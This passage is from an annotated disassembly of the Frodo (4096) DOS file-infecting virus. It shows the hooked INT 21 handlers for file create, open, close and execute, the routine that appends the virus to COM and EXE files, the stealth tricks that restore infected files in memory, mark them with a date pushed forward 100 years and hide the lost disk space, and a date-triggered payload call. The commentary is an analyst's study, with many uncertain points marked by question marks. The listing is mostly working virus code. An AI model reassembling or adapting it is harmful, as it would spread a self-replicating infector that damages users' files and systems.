05F2 E9C1FE         JMP    04B6    ;Restore registers and then iret.

;----------------------------------;
; Function 3C handler starts here. ;
;----------------------------------;
;Function 3C - Create file.

05F5 51             PUSH   CX      ;Save CX.

05F6 83E107         AND    CX,+07  ;Inspect first three bits of fattrib.
05F9 83F907         CMP    CX,+07  ;If the file is going to be read only,
05FC 742F           JZ     062D    ;system, and hidden then go to 062D.

05FE 59             POP    CX      ;Restore CX.

05FF E8E407         CALL   0DE6    ;Set ints 13 & 24 to Frodo's code.

0602 E8AF09         CALL   0FB4         ;Go run INT 21.

0605 E88408         CALL   0E8C    ;Set ints 13 & 24 to original ints.

0608 9C             PUSHF   ;Save flags (because of next comparison).

0609 2E803EDA1200   CMP    Byte Ptr CS:[12DA],00  ;Check Frodo's critical
                                                       ;int handler status.
060F 7404           JZ     0615      ;If no error then go to 0615.

;On a critical error (int 24) the routine jumps here.  It simply calls
;the real int 21 (perhaps to let its handlers take care of the critical error).
0611 9D             POPF                ;Restore flags.
0612 E91AFE         JMP    042F   ;Set up and call original int 21 (why?).

;On no error the routine comes to here, which checks for a Create File error
;and if none exists then it closes the file and jumps to the Open File routine
;in Frodo.
0615 9D             POPF                ;Restore flags.
0616 7209           JB     0621         ;On error (CF set) go to 0621.

0618 8BD8           MOV    BX,AX        ;Move handle from AX to BX.
061A B43E           MOV    AH,3E        ;Close file with handle.
061C E89509         CALL   0FB4         ;Go run INT 21.
061F EB10           JMP    0631

;On a Create File error the routine sets the Carry Flag and sets AX to the
;error code and then returns.
0621 2E800EB31201   OR     Byte Ptr CS:[12B3],01  ;Set Carry Flag.
0627 8946FC         MOV    [BP-04],AX   ;Put error code in AX.
062A E989FE         JMP    04B6    ;Restore registers and then iret.

;Routine jumps here if file is read only, sys, and hidden file.
062D 59             POP    CX     ;Restore CX.
062E E9FEFD         JMP    042F   ;Set up and call original int 21.

;----------------------------------;
; Function 3D handler starts here. ;
;----------------------------------;
;Function 3D - Open file.

;If the file to be opened is a program (COM or EXE) then Frodo saves the
;caller's PSP and the file's handle in a table.  Then when the file is
;closed, if the file's handle is in the table, it is infected.

0631 E85D04         CALL   0A91  ;Put PSP of current process in CS:[12A3].

0634 E80E04         CALL   0A45  ;Find out if a file is a program.
0637 7239           JB     0672  ;If not then go and call original int 21.

0639 2E803EA21200   CMP    Byte Ptr CS:[12A2],00  ;Check if "PSP table" is full.
063F 7431           JZ     0672         ;If so then go to 0672.

0641 E85A04         CALL   0A9E  ;Try to open the file.
0644 83FBFF         CMP    BX,FFFF  ;Check if it's impossible to infect.
0647 7429           JZ     0672     ;If so then go and call original int 21.

0649 2EFE0EA212     DEC    Byte Ptr CS:[12A2]  ;Put another entry in PSP table.

064E 0E             PUSH   CS              ;Set ES = CS.
064F 07             POP    ES

0650 BF5212         MOV    DI,1252     ;Scan the PSP table for an empty entry.
0653 B91400         MOV    CX,0014
0656 33C0           XOR    AX,AX       ;Empty entries have 0000 in them.
0658 F2             REPNZ              ;Do it.
0659 AF             SCASW

065A 2EA1A312       MOV    AX,CS:[12A3]   ;Put PSP of current (child's) proc. in AX.

065E 268945FE       MOV    ES:[DI-02],AX  ;Put PSP in the PSP "opened files" table.
0662 26895D26       MOV    ES:[DI+26],BX  ;Put file's handle in the 2nd table.

0666 895EFC         MOV    [BP-04],BX  ;Put handle on stack so that it will be
                                       ;popped into AX before IRET to caller.

0669 2E8026B312FE   AND    Byte Ptr CS:[12B3],FE  ;Clear Trap flag.
066F E944FE         JMP    04B6    ;Restore registers and then iret.

0672 E9BAFD         JMP    042F   ;Set up and call original int 21.

;----------------------------------;
; Function 3E handler starts here. ;
;----------------------------------;
;Function 3E - Close file.

;This function will add the virus to the end of a suitable file.

0675 0E             PUSH   CS            ;Set ES = CS.
0676 07             POP    ES

0677 E81704         CALL   0A91  ;Put PSP of current process (caller) in CS:[12A3].

067A BF5212         MOV    DI,1252       ;Get ready to scan the "PSP table."
067D B91400         MOV    CX,0014
0680 2EA1A312       MOV    AX,CS:[12A3]  ;Put PSP of caller in AX.

0684 F2             REPNZ                ;Do it.
0685 AF             SCASW

0686 7516           JNZ    069E  ;If PSP isn't in table then go do int 21.

0688 263B5D26       CMP    BX,ES:[DI+26]  ;Is handle same as one in table?
068C 75F6           JNZ    0684   ;If not then go get the next entry.

068E 26C745FE0000   MOV    Word Ptr ES:[DI-02],0000  ;Set the entry as "empty."

0694 E81C02         CALL   08B3              ;Infect a COM or EXE file.

0697 2EFE06A212     INC    Byte Ptr CS:[12A2]  ;Since another entry is free in
                                               ;the table, set "# of free entries"
                                               ;to reflect this.

069C EBCB           JMP    0669  ;Clear Trap flag and call original int 21.

069E E98EFD         JMP    042F   ;Set up and call original int 21.

;*******************************************************************************
;Procedure -- Sets DS:BX to current Disk Transfer Area.
06A1 06             PUSH   ES         ;Save ES.

06A2 B42F           MOV    AH,2F        ;Get DTA address.
06A4 E80D09         CALL   0FB4         ;Go run INT 21.

06A7 06             PUSH   ES           ;Set DS = ES.
06A8 1F             POP    DS

06A9 07             POP    ES        ;Restore ES.
06AA C3             RET

;----------------------------------;
; Function 4B handler starts here. ;
;----------------------------------;
;Function 4B - Execute program.

;This function will add the virus to the end of a suitable file.

;This part is for subfunction 0 (load and execute).
06AB 0AC0           OR     AL,AL     ;Is AL equal to zero?
06AD 7403           JZ     06B2     ;If so, jump to 06B2.
06AF E94E01         JMP    0800     ;If not, go to 0800.

06B2 1E             PUSH   DS   ;DS:DX points to filename to execute.
06B3 52             PUSH   DX

06B4 2E891E2412     MOV    CS:[1224],BX   ;ES:BX points to param. table.
06B9 2E8C062612     MOV    CS:[1226],ES

06BE 2EC5362412     LDS    SI,CS:[1224]   ;Point DS:SI at param. table.
06C3 BFF112         MOV    DI,12F1    ;ES:DI points at a space in Frodo.
06C6 B90E00         MOV    CX,000E   ;Parameter table is 0E bytes long.
06C9 0E             PUSH   CS           ;Set ES = CS.
06CA 07             POP    ES
06CB F3             REPZ           ;Copy parameter table to Frodo.
06CC A4             MOVSB

06CD 5E             POP    SI    ;Now DS:SI points at filename.
06CE 1F             POP    DS

06CF BF0713         MOV    DI,1307   ;ES:DI now points at space in Frodo.
06D2 B95000         MOV    CX,0050   ;Copy 50 bytes (is longest possible
                                          ;that filename could be (+path...))
06D5 F3             REPZ          ;Copy filename to Frodo.
06D6 A4             MOVSB

06D7 BBFFFF         MOV    BX,FFFF   ;Try to move Frodo down to get more
06DA E87D08         CALL   0F5A      ;contiguous memory.

06DD E81308         CALL   0EF3         ;Restore all registers.

06E0 5D             POP    BP  ;Get BP off (has been on for a while).

06E1 2E8F06E612     POP    CS:[12E6]   ;Get address and offset of caller.
06E6 2E8F06E812     POP    CS:[12E8]

06EB 2E8F06B312     POP    CS:[12B3]   ;Get flags off stack.

06F0 B8014B         MOV    AX,4B01  ;Execute program (Load but not exec).

06F3 0E             PUSH   CS         ;Set ES = CS.
06F4 07             POP    ES
06F5 BBF112         MOV    BX,12F1    ;ES:BX points to Frodo's parameter block.

06F8 9C             PUSHF
06F9 2EFF1E3512     CALL   FAR CS:[1235]    ;Call original int 21.
                                             ;Loads the program into memory.

06FE 7320           JNB    0720    ;If no error then go to 0720.

;Error occurred.
0700 2E830EB31201   OR     Word Ptr CS:[12B3],+01  ;Set carry flag.

0706 2EFF36B312     PUSH   CS:[12B3]  ;Put flags back on stack.

070B 2EFF36E812     PUSH   CS:[12E8]  ;Put address and offset of caller
0710 2EFF36E612     PUSH   CS:[12E6]  ;back on stack.

0715 55             PUSH   BP  ;Put BP back in place.

0716 8BEC           MOV    BP,SP       ;Set BP = SP.

0718 2EC41E2412     LES    BX,CS:[1224]   ;Restore original ES:BX.

071D E93FFD         JMP    045F   ;Set up and IRET to calling program.

;No error occurred.
0720 E86E03         CALL   0A91  ;Put PSP seg of current (CHILD'S) process in CS:[12A3].

0723 0E             PUSH   CS        ;Set ES = CS.
0724 07             POP    ES

;The next part goes through Frodo's "PSP table" and checks for any entries
;that point to this program's PSP.  If they do then it removes those entries,
;since those files aren't really open.
0725 BF5212         MOV    DI,1252      ;Set up to look in the "PSP table."
0728 B91400         MOV    CX,0014
072B 2EA1A312       MOV    AX,CS:[12A3]  ;Check for child's PSP in the table.
072F F2             REPNZ                ;Do it.
0730 AF             SCASW

0731 750D           JNZ    0740  ;If not there then go try to infect it.

0733 26C745FE0000   MOV    Word Ptr ES:[DI-02],0000  ;Clear that entry.
0739 2EFE06A212     INC    Byte Ptr CS:[12A2]  ;One more free spot in the table.
073E EBEB           JMP    072B     ;Go look for more entries of this PSP.

;Test if an EXE file has been infected by Frodo (IP = 0001 at start).
0740 2EC5360313     LDS    SI,CS:[1303]   ;Get CS:IP at start from param. block.
0745 83FE01         CMP    SI,+01  ;Is IP = 0001 at startup?
0748 7533           JNZ    077D   ;If not then file isn't infected; go to 077D.

;This part is to fix up an EXE file that has been infected.
074A 8B161A00       MOV    DX,[001A]     ;?
074E 83C210         ADD    DX,+10        ;?

0751 B451           MOV    AH,51   ;Get PSP seg of current (CHILD!) proc. in BX.
0753 E85E08         CALL   0FB4    ;(Is undocumented!)  Go run INT 21.

0756 03D3           ADD    DX,BX             ;?   (Readjusting the EXE header)
0758 2E89160513     MOV    CS:[1305],DX      ;?
075D FF361800       PUSH   [0018]            ;?
0761 2E8F060313     POP    CS:[1303]         ;?
0766 83C310         ADD    BX,+10            ;?
0769 031E1200       ADD    BX,[0012]         ;?
076D 2E891E0113     MOV    CS:[1301],BX      ;?
0772 FF361400       PUSH   [0014]            ;?
0776 2E8F06FF12     POP    CS:[12FF]         ;?

077B EB22           JMP    079F  ;Now that the EXE file is fixed, go run it.

;Test if a COM file has been infected by Frodo (sum of first 3 words is zero).
077D 8B04           MOV    AX,[SI]      ;Add the first three words together.
077F 034402         ADD    AX,[SI+02]
0782 034404         ADD    AX,[SI+04]
0785 7460           JZ     07E7  ;If answer is zero then file is infected, go to 07E7.

0787 0E             PUSH   CS        ;Set DS = CS.
0788 1F             POP    DS

0789 BA0713         MOV    DX,1307  ;DS:DX points to filename in Frodo.

078C E8B602         CALL   0A45  ;Find out if file is a program.  (Since
                                      ;the file has already been loaded, Frodo 
                                      ;KNOWS it's a file, but it is using the 
                                      ;routine to set CS:[0020] to the right 
                                      ;value.

078F E80C03         CALL   0A9E  ;See if the file can be infected.
                                      ;Since the file CAN be opened, this is
                                      ;being called to get the handle of the
                                      ;file in BX.

0792 2EFE06EF12     INC    Byte Ptr CS:[12EF]  ;Adjust # of free clusters...
0797 E81901         CALL   08B3                ;Infect a COM or EXE file.
079A 2EFE0EEF12     DEC    Byte Ptr CS:[12EF]  ;...during a program run.

079F B451           MOV    AH,51   ;Get PSP seg of current proc. in BX.
07A1 E81008         CALL   0FB4    ;(Is undocumented!)  Go run INT 21.

07A4 E86807         CALL   0F0F   ;Save registers on Frodo's stack.
07A7 E81107         CALL   0EBB   ;Restore original Break flag setting.
07AA E82D07         CALL   0EDA   ;Go and replace orig. int 21 handler with jump.
07AD E85607         CALL   0F06   ;Restore registers off Frodo's stack.

07B0 8EDB           MOV    DS,BX  ;Set DS and ES to segment of child's PSP.
07B2 8EC3           MOV    ES,BX

07B4 2EFF36B312     PUSH   CS:[12B3]   ;Push the flags.

07B9 2EFF36E812     PUSH   CS:[12E8]  ;Push address of caller...
07BE 2EFF36E612     PUSH   CS:[12E6]
07C3 8F060A00       POP    [000A]  ;...and pop it into the Termination Addr.
07C7 8F060C00       POP    [000C]  ;so the child will return to caller.

07CB 1E             PUSH   DS          ;Save DS.

07CC C5160A00       LDS    DX,[000A]   ;Set DS:DX to the Termination Addr.
07D0 B022           MOV    AL,22       ;Set int 22 (termination proc.) to DS:DX.
07D2 E8E708         CALL   10BC        ;Go set int 22's vector.

07D5 1F             POP    DS          ;Restore DS.

07D6 9D             POPF              ;Pop the flags (see line 07B4).

07D7 58             POP    AX         ;Where was AX pushed??????????

07D8 2E8E160113     MOV    SS,CS:[1301]  ;Set SS:SP to the SS:SP in the
07DD 2E8B26FF12     MOV    SP,CS:[12FF]  ;parameter table.

07E2 2EFF2E0313     JMP    FAR CS:[1303]  ;Jump to the child (it's CS:IP).

;This part is to fix up a COM file that has been infected.
07E7 8B5C01         MOV    BX,[SI+01]  ;Get offset of virus start from 
                                            ;jump command at very start.
07EA 8B809FFD       MOV    AX,[BX+SI-261]  ;Get first word (at CS:[0004])
07EE 8904           MOV    [SI],AX     ;and put it where it's supposed to be.
07F0 8B80A1FD       MOV    AX,[BX+SI-25F]  ;Get second word (at CS:[0006])
07F4 894402         MOV    [SI+02],AX  ;and put it where it's supposed to be.
07F7 8B80A3FD       MOV    AX,[BX+SI-25D]  ;Get third word (at CS:[0008])
07FB 894404         MOV    [SI+04],AX  ;and put it where it's supposed to be.

07FE EB9F           JMP    079F  ;Now that the COM file is fixed, go run it.

;This part is for subfunction 1 (load without executing).
0800 3C01           CMP    AL,01  ;Is AL equal to 1?
0802 7403           JZ     0807   ;If so, go on.
0804 E928FC         JMP    042F   ;Set up and call original int 21.

0807 2E830EB31201   OR     Word Ptr CS:[12B3],+01  ;Set carry flag in memory.

080D 2E891E2412     MOV    CS:[1224],BX   ;Save ptr. to caller's param. table.
0812 2E8C062612     MOV    CS:[1226],ES

0817 E8D906         CALL   0EF3         ;Restore all registers.

081A E89707         CALL   0FB4         ;Go run INT 21 (load the file).

081D E8A706         CALL   0EC7         ;Save all registers.

0820 2EC41E2412     LES    BX,CS:[1224]  ;Set ES:BX to point at caller's 
                                              ;parameter table.
0825 26C57712       LDS    SI,ES:[BX+12] ;Set DS:SI to child's CS:IP at start.

0829 726E           JB     0899          ;On error go and IRET.

082B 2E8026B312FE   AND    Byte Ptr CS:[12B3],FE  ;Clear carry flag in memory.

;Check if the program is an infected EXE file.
0831 83FE01         CMP    SI,+01  ;Is child's IP = 0001 at start?
0834 7423           JZ     0859  ;If so go to 0859 (infected EXE file).

;Check if the program is an infected COM file.
0836 8B04           MOV    AX,[SI]      ;Add the first 3 words together.
0838 034402         ADD    AX,[SI+02]
083B 034404         ADD    AX,[SI+04]

083E 7545           JNZ    0885  ;If sum isn't zero (file isn't infected)
                                      ;then go on.

;Fix an infected COM file.
0840 8B5C01         MOV    BX,[SI+01]  ;Get offset of virus start from 
                                            ;jump command at very start.

0843 8B809FFD       MOV    AX,[BX+SI+FD9F]  ;Get first word (at CS:[0004])
0847 8904           MOV    [SI],AX     ;and put it where it's supposed to be.
0849 8B80A1FD       MOV    AX,[BX+SI+FDA1]  ;Get second word (at CS:[0006])
084D 894402         MOV    [SI+02],AX  ;and put it where it's supposed to be.
0850 8B80A3FD       MOV    AX,[BX+SI+FDA3]  ;Get third word (at CS:[0008])
0854 894404         MOV    [SI+04],AX  ;and put it where it's supposed to be.
0857 EB2C           JMP    0885  ;Now that file is fixed, go to 0885.

;Fix an infected EXE file.
0859 8B161A00       MOV    DX,[001A]
085D E83102         CALL   0A91  ;Put PSP of current process in CS:[12A3].
0860 2E8B0EA312     MOV    CX,CS:[12A3]       ;? (Adjusting the EXE header)
0865 83C110         ADD    CX,+10             ;?
0868 03D1           ADD    DX,CX              ;?
086A 26895714       MOV    ES:[BX+14],DX      ;?
086E A11800         MOV    AX,[0018]          ;?
0871 26894712       MOV    ES:[BX+12],AX      ;?
0875 A11200         MOV    AX,[0012]          ;?
0878 03C1           ADD    AX,CX              ;?
087A 26894710       MOV    ES:[BX+10],AX      ;?
087E A11400         MOV    AX,[0014]          ;?
0881 2689470E       MOV    ES:[BX+0E],AX      ;?

;Set up the file's termination address and go back now.
0885 E80902         CALL   0A91  ;Put PSP of current (child) process in CS:[12A3].
0888 2E8E1EA312     MOV    DS,CS:[12A3]  ;Set up to access that PSP.

088D 8B4602         MOV    AX,[BP+02]  ;Get the caller's IP off the stack,
0890 A30A00         MOV    [000A],AX   ;and put it in the Termination Addr.
0893 8B4604         MOV    AX,[BP+04]  ;Get the caller's CS off the stack,
0896 A30C00         MOV    [000C],AX   ;and put it in the Termination Addr.

0899 E91AFC         JMP    04B6    ;Restore registers and then iret.

;----------------------------------;
; Function 30 handler starts here. ;
;----------------------------------;
;Function 30 - Get DOS version number.

089C 2EC606F01200   MOV    Byte Ptr CS:[12F0],00  ;Clear the attrib byte since
                                     ;a program is probably running, not DOS.

08A2 B42A           MOV    AH,2A        ;Get date.
08A4 E80D07         CALL   0FB4         ;Go run INT 21.

08A7 81FA1609       CMP    DX,0916  ;Check if is week after Frodo's bday.
08AB 7203           JB     08B0     ;Below that day, so go on.
08AD E82208         CALL   10D2     ;Go do something.
08B0 E97CFB         JMP    042F   ;Set up and call original int 21.

;*******************************************************************************
;Procedure -- Infect a COM or EXE file.
;The buffer at CS:[1200] already has the first 1C bytes of the file in it.
;SI has ????? in it.
;BX has the file's handle in it.
;CX has ????? in it.
08B3 E83005         CALL   0DE6  ;Set ints 13 & 24 to Frodo's code.

08B6 E8BC00         CALL   0975  ;Load the first 1C bytes into two buffers.

08B9 C606200001     MOV    Byte Ptr [0020],01  ;Set [20] to code for EXE file.

08BE 813E00124D5A   CMP    Word Ptr [1200],5A4D  ;Is first two bytes "ZM"?
08C4 740E           JZ     08D4                  ;If so then go to 08D4.

08C6 813E00125A4D   CMP    Word Ptr [1200],4D5A  ;Is first two bytes "MZ"?
08CC 7406           JZ     08D4                  ;If so then go to 08D4.

08CE FE0E2000       DEC    Byte Ptr [0020]   ;Set [20] to code for COM file.
08D2 7458           JZ     092C       ;If it is zero then go to COM part.

;Routine comes here if the file is an EXE file.
08D4 A10412         MOV    AX,[1204]  ;Put "Page Count" in AX.

08D7 D1E1           SHL    CX,1       ;What's in CX???
08D9 F7E1           MUL    CX

08DB 050002         ADD    AX,0200    ;?
08DE 3BC6           CMP    AX,SI      ;?
08E0 7248           JB     092A       ;?

08E2 A10A12         MOV    AX,[120A]  ;Put "MinAlloc" in AX.
08E5 0B060C12       OR     AX,[120C]  ;Is it equal to "MaxAlloc"?
08E9 743F           JZ     092A       ;If so then close file and return.

08EB A1A912         MOV    AX,[12A9]   ;Put the real file size in DX:AX.
08EE 8B16AB12       MOV    DX,[12AB]

08F2 B90002         MOV    CX,0200   ;Divide it by 0200 (512 in decimal).
08F5 F7F1           DIV    CX   ;After the divide, AX has number of pages
                                     ;in the EXE file, and DX has the last page
                                     ;size.

08F7 0BD2           OR     DX,DX  ;Is last page size equal to zero?
08F9 7401           JZ     08FC   ;If so then go ahead to 08FC.

08FB 40             INC    AX  ;Add one more to the number of pages in AX.
                                    ;Why does it do this???

08FC A30412         MOV    [1204],AX    ;Put AX in "Page Count" spot.
08FF 89160212       MOV    [1202],DX    ;Put DX in "Last Page Size" spot.

0903 833E141201     CMP    Word Ptr [1214],+01 ;Does original IP equal 0001?
0908 7462           JZ     096C                ;If so then go close the file.

090A C70614120100   MOV    Word Ptr [1214],0001 ;Set the original IP to 0001.

0910 8BC6           MOV    AX,SI        ;?
0912 2B060812       SUB    AX,[1208]    ;?

0916 A31612         MOV    [1216],AX      ;Set initial CS to value in AX.

0919 8306041208     ADD    Word Ptr [1204],+08 ;Add 8 pages to Page Count.
                                                    ;That equals 4096 bytes.

091E A30E12         MOV    [120E],AX      ;Set initial SS to value in AX.
0921 C70610120010   MOV    Word Ptr [1210],1000  ;Set initial SP to 1000.

0927 E8A900         CALL   09D3       ;Write the virus to the file.
092A EB40           JMP    096C       ;Close file and return.

;Routine comes here if the file is a COM file.
092C 81FE000F       CMP    SI,0F00
0930 733A           JNB    096C    ;Close file and return.

0932 A10012         MOV    AX,[1200]   ;Get first word of file...
0935 A30400         MOV    [0004],AX   ;...and write it into memory.

0938 03D0           ADD    DX,AX    ;Add the first word (in AX) to DX.

093A A10212         MOV    AX,[1202]   ;Get second word of file...
093D A30600         MOV    [0006],AX   ;...and write it into memory.

0940 03D0           ADD    DX,AX    ;Add the second word (in AX) to DX.

0942 A10412         MOV    AX,[1204]   ;Get third word of file...
0945 A30800         MOV    [0008],AX   ;...and write it into memory.

0948 03D0           ADD    DX,AX    ;Add the third word (in AX) to DX.

094A 7420           JZ     096C    ;Close file and return if the first 3
                                        ;words of the file add up to zero (this
                                        ;is Frodo's signature).

;The next few lines write a jump to the start of a COM file.
094C B1E9           MOV    CL,E9      ;Write the JMP command to the start
094E 880E0012       MOV    [1200],CL  ;of the file (still in mem).

0952 B81000         MOV    AX,0010    ;Calculate the offset to jump to.
0955 F7E6           MUL    SI
0957 056502         ADD    AX,0265

095A A30112         MOV    [1201],AX  ;Save the offset to the file's start.

095D A10012         MOV    AX,[1200]  ;Add the first two words of the
0960 03060212       ADD    AX,[1202]  ;file together and calculate what
0964 F7D8           NEG    AX         ;the third one should be to make the
                                           ;sum of all 3 equal zero.

0966 A30412         MOV    [1204],AX  ;Save that new word in the file.

0969 E86700         CALL   09D3       ;Write the virus to the file.

096C B43E           MOV    AH,3E        ;Close file with handle.
096E E84306         CALL   0FB4         ;Go run INT 21.

0971 E81805         CALL   0E8C   ;Set ints 13 and 24 to original values.
0974 C3             RET           ;Go back.

;*******************************************************************************
;Procedure -- Load the first 1C bytes of a file to infect into two buffers.
;BX is the file's handle.
;Sets SI to ??? on return.
;Sets DI to ??? on return.
0975 0E             PUSH   CS           ;Set DS = CS.
0976 1F             POP    DS

0977 B80057         MOV    AX,5700      ;Get file date & time with handle.
097A E83706         CALL   0FB4         ;Go run INT 21.

097D 890E2912       MOV    [1229],CX    ;Save time and date in memory.
0981 89162B12       MOV    [122B],DX

0985 B80042         MOV    AX,4200      ;Set file ptr to absolute offset
0988 33C9           XOR    CX,CX        ;from start of file (offset = 0).
098A 8BD1           MOV    DX,CX
098C E82506         CALL   0FB4         ;Go run INT 21.

098F B43F           MOV    AH,3F        ;Read file or device.
0991 B11C           MOV    CL,1C        ;Read 1C (28 in decimal) bytes.
0993 BA0012         MOV    DX,1200      ;Start of buffer is CS:[1200].
0996 E81B06         CALL   0FB4         ;Go run INT 21.

0999 B80042         MOV    AX,4200      ;Set file ptr to absolute offset
099C 33C9           XOR    CX,CX        ;from start of file (offset = 0).
099E 8BD1           MOV    DX,CX
09A0 E81106         CALL   0FB4         ;Go run INT 21.

09A3 B43F           MOV    AH,3F        ;Read file or device.
09A5 B11C           MOV    CL,1C        ;Read 1C (28 in decimal) bytes.
09A7 BA0400         MOV    DX,0004      ;Start of buffer is CS:[0004].
09AA E80706         CALL   0FB4         ;Go run INT 21.

09AD B80242         MOV    AX,4202      ;Set file ptr to signed offset
09B0 33C9           XOR    CX,CX        ;from end of file (offset = 0).
09B2 8BD1           MOV    DX,CX
09B4 E8FD05         CALL   0FB4         ;Go run INT 21.

09B7 A3A912         MOV    [12A9],AX    ;Save file's size in memory.
09BA 8916AB12       MOV    [12AB],DX    ;AX=lower half, DX=higher half.

09BE 8BF8           MOV    DI,AX        ;Put lower half of size in DI.

09C0 050F00         ADD    AX,000F      ;Add 15 to the file's size.
09C3 83D200         ADC    DX,+00

09C6 25F0FF         AND    AX,FFF0      ;Round off to the paragraph boundary.

09C9 2BF8           SUB    DI,AX        ;?

09CB B91000         MOV    CX,0010      ;?
09CE F7F1           DIV    CX           ;?

09D0 8BF0           MOV    SI,AX        ;?

09D2 C3             RET

;*******************************************************************************
;Procedure -- Write virus to file. 
;BX is file handle, DI is # of bytes to make file go to paragraph boundary.
09D3 B80042         MOV    AX,4200   ;Set file ptr to absolute offset
09D6 33C9           XOR    CX,CX     ;from start of file (offset = 0).
09D8 8BD1           MOV    DX,CX
09DA E8D705         CALL   0FB4         ;Go run INT 21.

09DD B440           MOV    AH,40       ;Write to file or device.
09DF B11C           MOV    CL,1C        ;Write 1C bytes.
09E1 BA0012         MOV    DX,1200      ;Start of buffer is 1200.
09E4 E8CD05         CALL   0FB4         ;Go run INT 21.

09E7 B81000         MOV    AX,0010   ;Does something with file's size.
09EA F7E6           MUL    SI        ;?
09EC 8BCA           MOV    CX,DX     ;?
09EE 8BD0           MOV    DX,AX     ;?

09F0 B80042         MOV    AX,4200    ;Set fptr to abs off from fstart.
09F3 E8BE05         CALL   0FB4         ;Go run INT 21.

09F6 33D2           XOR    DX,DX     ;Very start of Frodo in memory (??).
09F8 B90010         MOV    CX,1000   ;Write 1000 bytes (4096 in decimal)
09FB 03CF           ADD    CX,DI     ;(extend to paragraph boundary?).
09FD B440           MOV    AH,40        ;Write file or device.
09FF E8B205         CALL   0FB4         ;Go run INT 21.

0A02 B80157         MOV    AX,5701    ;Set file date & time.
0A05 8B0E2912       MOV    CX,[1229]  ;CX has file time.
0A09 8B162B12       MOV    DX,[122B]  ;DX has file date.
0A0D F6C680         TEST   DH,80      ;Has date had 100 yrs added to it?
0A10 7503           JNZ    0A15       ;Yes, so go right to INT 21.

0A12 80C6C8         ADD    DH,C8      ;No, so add 100 yrs to it.
0A15 E89C05         CALL   0FB4         ;Go run INT 21.

0A18 803EEE1203     CMP    Byte Ptr [12EE],03  ;Is DOS ver. 3.x running?
0A1D 7219           JB     0A38                ;If not then go return.

0A1F 803EEF1200     CMP    Byte Ptr [12EF],00  ;Is it okay to adjust # of free clusters?
0A24 7412           JZ     0A38                ;If not then go return.

0A26 53             PUSH   BX
0A27 8A162812       MOV    DL,[1228]  ;Put drive no. of next oper. in DL.

;Frodo has saved the number of free clusters on the disk earlier, and when
;a file is infected Frodo puts the # of free clusters to what it would be
;without the new virus.  That way the number of free bytes on a disk won't
;change.

;This code is fine since Frodo checks if DOS ver. 3.x is running before it
;does the next thing.
0A2B B432           MOV    AH,32     ;Get Drive Parameter Block for specific
                                     ;drive (in DL).  DS:BX has address.
                                     ;Is undocumented and changes from DOS
                                     ;version to version.  This code works
                                     ;with version 3.x only.
0A2D E88405         CALL   0FB4      ;Go run INT 21.

0A30 2EA1EC12       MOV    AX,CS:[12EC] ;Put # of free clusters on disk in AX.
0A34 89471E         MOV    [BX+1E],AX  ;Save number of free clusters on disk
                                       ;(DOS 3.x only!)

0A37 5B             POP    BX          ;Restore BX.
0A38 C3             RET

;*******************************************************************************
;Procedure -- Sets or clears the Carry Flag depending on whether a file is
;a COM or EXE file.  This one is for FCB operations.
;At the start of the procedure, DS:DX points to an open FCB.
0A39 E8D304         CALL   0F0F     ;Save registers on Frodo's stack.

;Set ES:DI to point to the file extension in the FCB.
0A3C 8BFA           MOV    DI,DX    ;?
0A3E 83C70D         ADD    DI,+0D   ;?

0A41 1E             PUSH   DS       ;Set ES = DS.
0A42 07             POP    ES

0A43 EB20           JMP    0A65

;*******************************************************************************
;Procedure -- Sets or clears the Carry Flag depending on whether a file is
;a COM or EXE file.  This one is for handle operations.
;At the start of the procedure, DS:DX points to an ASCIIZ file name.
0A45 E8C704         CALL   0F0F     ;Save registers on Frodo's stack.

;Set ES:DI to point to the filename.
0A48 1E             PUSH   DS       ;Set ES = DS.
0A49 07             POP    ES
0A4A 8BFA           MOV    DI,DX    ;Set DI = DX.

0A4C B95000         MOV    CX,0050  ;Scan 50 (80 in decimal) bytes.
                                 ;That's the longest an asciiz filename can be.

0A4F 33C0           XOR    AX,AX    ;Set AX = 0.

0A51 B300           MOV    BL,00    ;Set BL = 0.
0A53 807D013A       CMP    Byte Ptr [DI+01],3A  ;Check if the second byte
                                     ;in the filename is a ":", which means that 
                                     ;the file is probably on a different drive 
                                     ;than the current one.
0A57 7505           JNZ    0A5E      ;If not a colon then go on to 0A5E.
                                     ;If the routine jumps to 0A5E then 00 is
                                     ;stored in CS:[1228], which means "the
                                     ;default drive".

0A59 8A1D           MOV    BL,[DI]  ;Move the drive name into BL.
0A5B 80E31F         AND    BL,1F  ;Change it from letter to drive number.
0A5E 2E881E2812     MOV    CS:[1228],BL   ;Save that drive number in mem.

0A63 F2             REPNZ       ;Scan for the null character at the end
0A64 AE             SCASB       ;of the filename.

0A65 8B45FD         MOV    AX,[DI-03] ;Get last 2 letters of file extension.
0A68 25DFDF         AND    AX,DFDF
0A6B 02E0           ADD    AH,AL

0A6D 8A45FC         MOV    AL,[DI-04] ;Get first letter of file extension.
0A70 24DF           AND    AL,DF
0A72 02C4           ADD    AL,AH

0A74 2EC606200000   MOV    Byte Ptr CS:[0020],00  ;Set [20] to COM code.
0A7A 3CDF           CMP    AL,DF        ;Is file a COM file?
0A7C 7409           JZ     0A87         ;If so then go to 0A87.

0A7E 2EFE062000     INC    Byte Ptr CS:[0020]  ;Set [20] to EXE code.
0A83 3CE2           CMP    AL,E2        ;Is file an EXE file?
0A85 7505           JNZ    0A8C         ;If so then go to 0A8C.

;Clears the Carry flag if the file is a COM or EXE file.
0A87 E87C04         CALL   0F06   ;Restore registers off Frodo's stack.
0A8A F8             CLC           ;Clear Carry flag.
0A8B C3             RET

;Sets the Carry flag if the file isn't an executable file.
0A8C E87704         CALL   0F06   ;Restore registers off Frodo's stack.
0A8F F9             STC           ;Set Carry flag.
0A90 C3             RET

;*******************************************************************************
;Procedure -- Get PSP segment of current process and save it at CS:[12A3].
0A91 53             PUSH   BX      ;Save register.

0A92 B451           MOV    AH,51   ;Get PSP seg of current proc. in BX.
0A94 E81D05         CALL   0FB4    ;(Is undocumented!)  Go run INT 21.

0A97 2E891EA312     MOV    CS:[12A3],BX   ;Save it in memory.

0A9C 5B             POP    BX      ;Restore register.
0A9D C3             RET

;*******************************************************************************
;Procedure -- Make sure there's room to infect a file and open the file.
;Returns BX=FFFF if function fails.
;Returns BX=handle if function succeeds.
0A9E E84503         CALL   0DE6  ;Set ints 13 & 24 to Frodo's code.

0AA1 52             PUSH   DX    ;Save DX.

0AA2 2E8A162812     MOV    DL,CS:[1228]  ;Put drive no. of next oper. in DL.

0AA7 B436           MOV    AH,36        ;Get drive allocation info.
0AA9 E80805         CALL   0FB4         ;Go run INT 21.

0AAC F7E1           MUL    CX       ;Calculates free disk space in bytes.
0AAE F7E3           MUL    BX

